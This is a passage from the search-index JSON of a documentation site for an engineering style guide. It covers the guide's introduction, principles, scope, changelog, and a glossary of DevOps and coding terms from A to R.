{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"The Dukes Engineering Style Guide","text":"","tags":["style-guide","devops","infrastructure-as-code","best-practices","ai-optimized"]},{"location":"#introduction","title":"Introduction","text":"<p>The Dukes Engineering Style Guide defines a unified, opinionated standard for writing infrastructure and application code that is both human-readable and AI-optimized. It is designed to create consistency across Terraform, Terragrunt, Ansible, Kubernetes, Bash, and Python ecosystems \u2014 enabling reproducible automation and long-term maintainability.</p> <p>This guide reflects practical standards derived from real-world DevOps, SRE, and automation practices. Its intent is to strike the right balance between flexibility and rigor \u2014 allowing engineers to focus on building systems instead of debating style.</p>","tags":["style-guide","devops","infrastructure-as-code","best-practices","ai-optimized"]},{"location":"#core-principles","title":"Core Principles","text":"<ol> <li> <p>Clarity First:    Code must communicate intent before it executes logic.    Readability and maintainability take precedence over brevity.</p> </li> <li> <p>Automation by Default:    Everything that can be automated \u2014 linting, formatting, testing, and deployment \u2014 is automated.</p> </li> <li> <p>Security and Stability:    Secrets are always managed securely, dependencies are pinned, and environments are deterministic.</p> </li> <li> <p>Reproducibility:    Builds, tests, and deployments must produce consistent outcomes across local, CI, and production environments.</p> </li> <li> <p>Human + AI Collaboration:    Every standard is designed for dual readability \u2014 equally interpretable by developers and AI assistants.</p> </li> </ol>","tags":["style-guide","devops","infrastructure-as-code","best-practices","ai-optimized"]},{"location":"#scope","title":"Scope","text":"<p>This guide provides style and structure conventions for the following domains:</p> <ul> <li>Infrastructure as Code (IaC): Terraform with Terragrunt, Ansible, Kubernetes YAMLs</li> <li>Scripting: Bash and PowerShell</li> <li>Application Code: Python, Node.js, TypeScript, Go, Groovy</li> <li>Pipelines: Declarative Jenkins, CI/CD YAML, GitHub Actions</li> <li>Data and Querying: SQL and related database scripts</li> </ul> <p>Each section defines:</p> <ul> <li>Standardized formatting rules</li> <li>Naming conventions</li> <li>Directory and module structure</li> <li>Security and secret management practices</li> <li>Documentation expectations</li> <li>AI-annotation standards (metadata blocks and comment schemas)</li> </ul>","tags":["style-guide","devops","infrastructure-as-code","best-practices","ai-optimized"]},{"location":"#document-structure","title":"Document Structure","text":"Section Description 1. Foundations Global principles, file structure, documentation format 2. Language Guides Specific rules for Python, Bash, Terraform, and others 3. Automation &amp; Testing Pre-commit, linting, CI/CD, and test orchestration 4. AI Metadata Comment schemas, structured annotations, and promptable code 5. Templates &amp; Samples Example repositories, starter modules, and CI workflows <p>Each section is modular and self-contained, allowing this guide to evolve alongside your toolchain.</p>","tags":["style-guide","devops","infrastructure-as-code","best-practices","ai-optimized"]},{"location":"#how-to-use-this-guide","title":"How to Use This Guide","text":"<ul> <li>For human readers, this guide acts as a living documentation of your engineering standards.</li> <li>For AI models, embedded metadata blocks and clear structure enable code generation, refactoring,   and auditing with minimal ambiguity.</li> </ul> <p>You can contribute to this repository using standard Git workflows:</p> <p>```bash git clone https://github.com/tydukes/coding-style-guide.git cd coding-style-guide</p>","tags":["style-guide","devops","infrastructure-as-code","best-practices","ai-optimized"]},{"location":"changelog/","title":"Changelog","text":"","tags":["changelog","history","releases","versions"]},{"location":"changelog/#changelog","title":"Changelog","text":"<p>All notable changes to this project will be documented in this file.</p> <p>The format is based on Keep a Changelog, and this project adheres to Semantic Versioning.</p>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#unreleased","title":"[Unreleased]","text":"","tags":["changelog","history","releases","versions"]},{"location":"changelog/#added","title":"Added","text":"<ul> <li>Comprehensive YAML frontmatter to all 21 documentation files (#83)</li> <li>Includes title, description, author, date, tags, category, status, version</li> <li>Improves MkDocs Material theme integration</li> <li>Enables better search and navigation</li> <li>Comprehensive repository structure documentation (#84)</li> <li>Expanded structure.md from 14 to 467+ lines</li> <li>Added three recommended organizational patterns (monorepo, multi-repo, hybrid)</li> <li>Directory standards and naming conventions</li> <li>File organization best practices</li> <li>Infrastructure as Code organization guidance</li> <li>CI/CD organization patterns</li> <li>Version control patterns (GitFlow)</li> <li>Makefile organization examples</li> <li>Migration strategies between patterns</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#fixed","title":"Fixed","text":"<ul> <li>Critical contradiction in structure.md that incorrectly stated project is \"multi-repo\" (#84)</li> <li>Duplicate H1 headings in documentation (MkDocs Material uses frontmatter titles) (#83)</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#changed","title":"Changed","text":"<ul> <li>Documentation structure now uses frontmatter titles instead of markdown H1 headings (#83)</li> <li>structure.md version bumped from 1.0.0 to 1.1.0 for significant content addition (#84)</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#121-2025-10-28","title":"[1.2.1] - 2025-10-28","text":"","tags":["changelog","history","releases","versions"]},{"location":"changelog/#changed_1","title":"Changed","text":"<ul> <li>Optimized Dockerfile to reduce image layers and improve build efficiency (#9)</li> <li>Sorted apt-get package names alphabetically (bash, curl, git, shellcheck)</li> <li>Merged consecutive RUN instructions</li> <li>Used COPY --chmod=755 instead of separate RUN chmod command</li> <li>Combined UV installation with system dependencies setup</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#fixed_1","title":"Fixed","text":"<ul> <li>Hadolint warnings in Dockerfile (#9)</li> <li>DL3018: Sort package names alphabetically</li> <li>DL3031: Merge consecutive RUN instructions</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#120-2025-10-27","title":"[1.2.0] - 2025-10-27","text":"","tags":["changelog","history","releases","versions"]},{"location":"changelog/#changed_2","title":"Changed","text":"<ul> <li>Dependency updates via Dependabot   (#5,   #6,   #7,   #8)</li> <li>Bumped Python base image from 3.10-slim to 3.14-slim</li> <li>Bumped actions/checkout from v4 to v5</li> <li>Bumped docker/build-push-action from v5 to v6</li> <li>Bumped actions/upload-artifact from v4 to v5</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#110-2025-10-27","title":"[1.1.0] - 2025-10-27","text":"","tags":["changelog","history","releases","versions"]},{"location":"changelog/#added_1","title":"Added","text":"<ul> <li>Comprehensive integration guide at <code>docs/07_integration/integration_prompt.md</code> (#3)</li> <li>Copy-paste prompts for integrating validator into other repositories</li> <li>GitHub Actions integration examples</li> <li>GitLab CI integration examples</li> <li>Local development integration patterns</li> <li>Platform-specific prompts</li> <li>Customization options</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#fixed_2","title":"Fixed","text":"<ul> <li>Nested code block rendering issues by escaping inner backticks (#3)</li> <li>Line length issues in mkdocs.yml and docs/index.md (#3)</li> <li>Container workflow unauthorized error during PR testing (#3)</li> <li>Added <code>load: true</code> for PRs to make built image available locally</li> <li>Tests locally built image instead of pulling from registry</li> <li>Builds only amd64 for PRs (faster), multi-arch for main branch pushes</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#changed_3","title":"Changed","text":"<ul> <li>Updated mkdocs.yml navigation to include integration guide (#3)</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#100-2025-10-27","title":"[1.0.0] - 2025-10-27","text":"<p>Initial release of the Dukes Engineering Style Guide.</p>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#added_2","title":"Added","text":"<ul> <li>Container Infrastructure</li> <li>Multi-stage Dockerfile with UV and all validation tools     (#1,     #2)</li> <li>Smart docker-entrypoint.sh with multiple modes (validate, lint, format, docs, metadata)</li> <li>docker-compose.yml for local development</li> <li> <p>.dockerignore for efficient build context</p> </li> <li> <p>GitHub Actions Integration</p> </li> <li>Reusable composite action at <code>.github/actions/validate/action.yml</code></li> <li>Container build/publish workflow with GHCR</li> <li>Support for all validation modes with configurable inputs</li> <li> <p>Multi-architecture builds (linux/amd64, linux/arm64)</p> </li> <li> <p>Documentation</p> </li> <li>MkDocs-based documentation site with Material theme</li> <li>Container usage guide at <code>docs/06_container/usage.md</code></li> <li>Integration examples for various platforms</li> <li>Language guides (Python, Terraform, Bash, TypeScript, etc.)</li> <li>Metadata schema documentation</li> <li> <p>CI/CD pipeline documentation</p> </li> <li> <p>Validation Tools</p> </li> <li>Python linting and formatting (Black, Flake8)</li> <li>YAML validation (yamllint)</li> <li>Shell script validation (shellcheck)</li> <li>Markdown validation (markdownlint)</li> <li>Terraform validation (fmt, validate, docs)</li> <li> <p>Metadata validation script</p> </li> <li> <p>Development Workflow</p> </li> <li>Pre-commit hooks configuration</li> <li>Makefile with common targets</li> <li>CLI wrapper script (scripts/validate-container.sh)</li> <li> <p>GitHub Actions workflows (CI, deployment)</p> </li> <li> <p>Templates and Examples</p> </li> <li>README template</li> <li>Example integrations for GitHub Actions, GitLab CI, Jenkins</li> <li>Makefile examples</li> <li>Shell script examples</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#project-structure","title":"Project Structure","text":"<pre><code>coding-style-guide/\n\u251c\u2500\u2500 docs/                  # MkDocs documentation\n\u2502   \u251c\u2500\u2500 01_overview/      # Principles, governance, structure\n\u2502   \u251c\u2500\u2500 02_language_guides/ # Language-specific guides\n\u2502   \u251c\u2500\u2500 03_metadata_schema/ # Schema documentation\n\u2502   \u251c\u2500\u2500 04_templates/     # Document templates\n\u2502   \u251c\u2500\u2500 05_ci_cd/         # CI/CD patterns\n\u2502   \u251c\u2500\u2500 06_container/     # Container usage\n\u2502   \u2514\u2500\u2500 index.md          # Home page\n\u251c\u2500\u2500 .github/\n\u2502   \u251c\u2500\u2500 workflows/        # CI/CD workflows\n\u2502   \u2514\u2500\u2500 actions/          # Custom actions\n\u251c\u2500\u2500 scripts/              # Automation scripts\n\u251c\u2500\u2500 Dockerfile           # Container definition\n\u251c\u2500\u2500 docker-compose.yml   # Local development\n\u2514\u2500\u2500 mkdocs.yml          # Documentation config\n</code></pre>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#release-links","title":"Release Links","text":"<ul> <li>Unreleased</li> <li>1.2.1 - 2025-10-28</li> <li>1.2.0 - 2025-10-27</li> <li>1.1.0 - 2025-10-27</li> <li>1.0.0 - 2025-10-27</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#versioning-policy","title":"Versioning Policy","text":"<p>This project follows Semantic Versioning:</p> <ul> <li>MAJOR version: Incompatible changes to validation rules or container interface</li> <li>MINOR version: New features, language guides, or significant documentation additions</li> <li>PATCH version: Bug fixes, dependency updates, documentation improvements</li> </ul>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#contributing","title":"Contributing","text":"<p>See CONTRIBUTING.md for guidelines on proposing changes and creating pull requests.</p>","tags":["changelog","history","releases","versions"]},{"location":"changelog/#security","title":"Security","text":"<p>For security-related changes or vulnerability reports, see SECURITY.md.</p>","tags":["changelog","history","releases","versions"]},{"location":"glossary/","title":"Glossary","text":"<p>This glossary defines terms used throughout the Dukes Engineering Style Guide, including technical concepts, tool names, metadata tags, and industry terminology.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#a","title":"A","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#ai-assistant","title":"AI Assistant","text":"<p>A software tool that uses artificial intelligence to help with code writing, review, and understanding. Examples include Claude, GitHub Copilot, and ChatGPT. The style guide optimizes code metadata for better AI comprehension.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#ansible","title":"Ansible","text":"<p>An open-source automation tool for configuration management, application deployment, and task automation. Uses YAML playbooks to define infrastructure as code.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#api-application-programming-interface","title":"API (Application Programming Interface)","text":"<p>A set of rules and protocols that allows different software applications to communicate with each other. Commonly refers to RESTful HTTP APIs in web services.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#api-endpoint","title":"API Endpoint","text":"<p>A specific URL path and HTTP method combination that provides access to a resource or function in an API. Example: <code>POST /auth/login</code>.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#automation","title":"Automation","text":"<p>The use of tools and scripts to perform tasks automatically without manual intervention. Core principle of the style guide for enforcing standards.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#b","title":"B","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#bash","title":"Bash","text":"<p>Unix shell and command language used for scripting and automation. Commonly used for deployment scripts, CI/CD pipelines, and system administration tasks.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#black","title":"Black","text":"<p>An opinionated Python code formatter that automatically formats code to a consistent style. Eliminates debates about formatting by providing one standard style.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#block-comment","title":"Block Comment","text":"<p>A multi-line comment enclosed in special syntax. Example in Terraform: <code>/* comment */</code>, in Python: <code>\"\"\"docstring\"\"\"</code>.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#boolean","title":"Boolean","text":"<p>A data type with two possible values: <code>true</code> or <code>false</code>. Often used for configuration flags and conditional logic.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#branch","title":"Branch","text":"<p>A parallel version of a repository in version control. Allows development of features in isolation from the main codebase.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#breaking-change","title":"Breaking Change","text":"<p>A modification to code or API that is not backward-compatible and requires users to update their code. Triggers a MAJOR version increment in semantic versioning.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#c","title":"C","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#camelcase","title":"camelCase","text":"<p>A naming convention where the first word is lowercase and subsequent words are capitalized. Example: <code>getUserDetails</code>. Common in JavaScript and TypeScript.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#cicd-continuous-integration-continuous-deployment","title":"CI/CD (Continuous Integration / Continuous Deployment)","text":"<p>Practices that automate the building, testing, and deployment of code. CI runs automated tests on every commit; CD automatically deploys passing code to production.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#cli-command-line-interface","title":"CLI (Command-Line Interface)","text":"<p>A text-based interface for interacting with software through commands typed into a terminal. Example: <code>git commit -m \"message\"</code>.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#code-review","title":"Code Review","text":"<p>The process of examining code changes before they are merged, typically through pull requests. Focuses on logic, architecture, and design rather than formatting.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#container","title":"Container","text":"<p>A lightweight, standalone package of software that includes everything needed to run an application: code, runtime, libraries, and dependencies. Docker is the most common container platform.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#convention","title":"Convention","text":"<p>An agreed-upon standard or pattern used consistently across a codebase. Examples include naming conventions and code structure patterns.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#d","title":"D","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#dependency","title":"Dependency","text":"<p>An external library, package, or module that code relies on to function. Should be documented in metadata tags.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#deployment","title":"Deployment","text":"<p>The process of releasing software to a target environment (production, staging, or development).</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#deprecation","title":"Deprecation","text":"<p>Marking a feature, function, or module as obsolete and scheduled for removal. Uses <code>@status deprecated</code> metadata tag.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#development-environment","title":"Development Environment","text":"<p>The local or remote system where developers write and test code, typically with debugging tools and test data.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#devops","title":"DevOps","text":"<p>A set of practices that combines software development (Dev) and IT operations (Ops) to shorten development cycles and deliver high-quality software.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#docker","title":"Docker","text":"<p>A platform for developing, shipping, and running applications in containers. Ensures consistency across development, testing, and production environments.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#documentation","title":"Documentation","text":"<p>Written explanations of how code works, including inline comments, README files, and generated API docs. Auto-generated from metadata in this style guide.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#dry-run","title":"Dry Run","text":"<p>Executing a command in simulation mode without making actual changes. Useful for testing potentially destructive operations.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#e","title":"E","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#editorconfig","title":"EditorConfig","text":"<p>A file format and collection of editor plugins for maintaining consistent coding styles across different editors and IDEs.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#environment-variable","title":"Environment Variable","text":"<p>A dynamic value that can affect how processes behave on a computer. Often used to configure applications without hardcoding values. Example: <code>API_KEY=abc123</code>.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#eof-end-of-file","title":"EOF (End of File)","text":"<p>A marker indicating the end of a file. Files should end with exactly one blank line per style guide convention.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#eslint","title":"ESLint","text":"<p>A static analysis tool for identifying problematic patterns in JavaScript/TypeScript code. Enforces code quality and style rules.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#f","title":"F","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#feature-branch","title":"Feature Branch","text":"<p>A git branch created to develop a specific feature in isolation. Named with <code>feature/</code> prefix. Example: <code>feature/add-user-auth</code>.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#flake8","title":"Flake8","text":"<p>A Python linting tool that checks code for style violations, programming errors, and complexity. Combines pycodestyle, pyflakes, and McCabe.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#formatter","title":"Formatter","text":"<p>A tool that automatically reformats code to match style guidelines. Examples include Black (Python), Prettier (JavaScript/TypeScript), and terraform fmt.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#function","title":"Function","text":"<p>A reusable block of code that performs a specific task. Should be named with verb-noun format: <code>get_user()</code>, <code>calculate_total()</code>.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#g","title":"G","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#git","title":"Git","text":"<p>A distributed version control system for tracking changes in source code during software development.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#github-actions","title":"GitHub Actions","text":"<p>A CI/CD platform that automates workflows directly in GitHub repositories. Used for testing, building, and deploying code.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#gitflow","title":"GitFlow","text":"<p>A branching model for Git that uses specific branch types (main, develop, feature, release, hotfix) with strict merge rules.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#gitlab-ci","title":"GitLab CI","text":"<p>GitLab's integrated CI/CD platform. Uses <code>.gitlab-ci.yml</code> configuration files to define pipelines.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#glob-pattern","title":"Glob Pattern","text":"<p>A pattern-matching syntax using wildcards. Example: <code>**/*.py</code> matches all Python files in all subdirectories.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#groovy","title":"Groovy","text":"<p>A dynamic programming language for the Java platform. Used for Jenkins pipeline scripts and Gradle build files.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#h","title":"H","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#hash-comment","title":"Hash Comment","text":"<p>A single-line comment starting with <code>#</code>. Used in Python, Bash, YAML, Terraform, and other languages.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#hcl-hashicorp-configuration-language","title":"HCL (HashiCorp Configuration Language)","text":"<p>The configuration language used by Terraform and other HashiCorp tools. Declarative syntax for defining infrastructure.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#helm","title":"Helm","text":"<p>A package manager for Kubernetes that uses charts to define, install, and upgrade Kubernetes applications.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#hook","title":"Hook","text":"<p>A script or command that runs automatically in response to specific events. Examples include pre-commit hooks and CI/CD hooks.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#hotfix-branch","title":"Hotfix Branch","text":"<p>A git branch created from main to fix critical production bugs. Named with <code>hotfix/</code> prefix. Must be merged to both main and develop.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#i","title":"I","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#iac-infrastructure-as-code","title":"IAC (Infrastructure as Code)","text":"<p>Managing and provisioning infrastructure through machine-readable definition files rather than manual configuration. Examples: Terraform, Ansible.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#ide-integrated-development-environment","title":"IDE (Integrated Development Environment)","text":"<p>Software application providing comprehensive facilities for software development. Examples: VSCode, PyCharm, IntelliJ IDEA.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#idempotent","title":"Idempotent","text":"<p>An operation that produces the same result no matter how many times it's executed. Important for automation and infrastructure code.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#import","title":"Import","text":"<p>Including code from external modules or libraries. Should be organized by type: standard library, third-party, local modules.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#inline-comment","title":"Inline Comment","text":"<p>A comment on the same line as code or immediately above it. Should explain why, not what.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#iso-8601","title":"ISO 8601","text":"<p>International standard for date and time formats. Used for <code>@last_updated</code> metadata tag. Example: <code>2025-10-28</code>.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#j","title":"J","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#jenkins","title":"Jenkins","text":"<p>An open-source automation server for building, testing, and deploying software. Uses Groovy for pipeline definitions.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#jsdoc","title":"JSDoc","text":"<p>A markup language for annotating JavaScript and TypeScript code with documentation comments. Uses <code>/** ... */</code> syntax.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#json-javascript-object-notation","title":"JSON (JavaScript Object Notation)","text":"<p>A lightweight data interchange format. Human-readable text to store and transmit data objects. Common for configuration files.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#jwt-json-web-token","title":"JWT (JSON Web Token)","text":"<p>A compact, URL-safe means of representing claims between two parties. Commonly used for authentication in web applications.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#k","title":"K","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#kebab-case","title":"kebab-case","text":"<p>A naming convention where words are lowercase and separated by hyphens. Example: <code>user-authentication</code>. Common for file names and URLs.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#kubernetes","title":"Kubernetes","text":"<p>An open-source container orchestration platform for automating deployment, scaling, and management of containerized applications.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#l","title":"L","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#language-server-protocol-lsp","title":"Language Server Protocol (LSP)","text":"<p>A protocol between editors and language servers that provides IDE features like autocomplete, go-to-definition, and refactoring.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#linter","title":"Linter","text":"<p>A static code analysis tool that checks for programming errors, bugs, stylistic errors, and suspicious constructs. Examples: Flake8, ESLint, ShellCheck.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#logging","title":"Logging","text":"<p>The process of recording events, errors, and information during program execution. Essential for debugging and monitoring.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#m","title":"M","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#major-version","title":"MAJOR Version","text":"<p>The first number in semantic versioning (MAJOR.MINOR.PATCH). Incremented for incompatible API changes or breaking changes.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#main-branch","title":"Main Branch","text":"<p>The primary branch in a Git repository containing production-ready code. Protected from direct commits.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#makefile","title":"Makefile","text":"<p>A file containing commands and dependencies for build automation using the <code>make</code> command. Organizes common development tasks.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#metadata","title":"Metadata","text":"<p>Data that provides information about other data. In this style guide, structured tags in code comments describing modules, versions, dependencies, etc.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#minor-version","title":"MINOR Version","text":"<p>The second number in semantic versioning (MAJOR.MINOR.PATCH). Incremented for new backward-compatible functionality.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#mocking","title":"Mocking","text":"<p>Creating fake objects or responses for testing purposes. Allows testing code in isolation without external dependencies.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#module","title":"Module","text":"<p>A self-contained unit of code with a specific purpose. Should include <code>@module</code> metadata tag with unique identifier.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#monorepo","title":"Monorepo","text":"<p>A single repository containing multiple projects or services. Contrast with multi-repo where each project has its own repository.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#mkdocs","title":"MkDocs","text":"<p>A static site generator for building project documentation from Markdown files. Used for this style guide's documentation site.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#multi-repo","title":"Multi-repo","text":"<p>Repository organization pattern where each project or service has its own separate repository. Contrast with monorepo.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#mypy","title":"Mypy","text":"<p>A static type checker for Python that uses type hints to catch type-related errors before runtime.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#n","title":"N","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#naming-convention","title":"Naming Convention","text":"<p>Rules for naming variables, functions, classes, and files. Varies by language but should be consistent within a codebase.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#nat-gateway","title":"NAT Gateway","text":"<p>Network Address Translation gateway in AWS VPC that allows instances in private subnets to access the internet.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#nodejs","title":"Node.js","text":"<p>JavaScript runtime built on Chrome's V8 engine. Allows running JavaScript on the server side.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#npm-node-package-manager","title":"npm (Node Package Manager)","text":"<p>Package manager for JavaScript. Used to install, manage, and publish Node.js packages.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#o","title":"O","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#oauth","title":"OAuth","text":"<p>Open standard for access delegation, commonly used for token-based authentication. Allows third-party services to exchange information without sharing passwords.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#oop-object-oriented-programming","title":"OOP (Object-Oriented Programming)","text":"<p>Programming paradigm based on the concept of objects containing data and code. Languages: Python, Java, TypeScript.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#p","title":"P","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#pascalcase","title":"PascalCase","text":"<p>A naming convention where every word starts with an uppercase letter. Example: <code>UserAuthentication</code>. Used for class names.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#patch-version","title":"PATCH Version","text":"<p>The third number in semantic versioning (MAJOR.MINOR.PATCH). Incremented for backward-compatible bug fixes.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#pipeline","title":"Pipeline","text":"<p>A sequence of automated processes in CI/CD. Each stage performs specific tasks like building, testing, and deploying.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#powershell","title":"PowerShell","text":"<p>A task automation framework from Microsoft consisting of a command-line shell and scripting language. Used for Windows system administration.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#pre-commit-hook","title":"Pre-commit Hook","text":"<p>A script that runs automatically before a commit is created. Used to enforce code quality standards before code enters version control.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#prettier","title":"Prettier","text":"<p>An opinionated code formatter for JavaScript, TypeScript, JSON, YAML, and other languages. Ensures consistent formatting across projects.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#pull-request-pr","title":"Pull Request (PR)","text":"<p>A method of submitting contributions to a project. Allows code review and discussion before merging changes into the main branch.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#python","title":"Python","text":"<p>A high-level, interpreted programming language known for readability and versatility. Used for web development, data analysis, automation, and more.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#q","title":"Q","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#quality-gate","title":"Quality Gate","text":"<p>A set of conditions that code must meet before being merged or deployed. May include test coverage, code quality metrics, and security scans.</p>","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#r","title":"R","text":"","tags":["glossary","terms","definitions","reference","dictionary"]},{"location":"glossary/#readme","title":"README","text":"<p>A text file containing information about a project. Typically the first file users see when visiting a repository. Should include setup instructions and usage 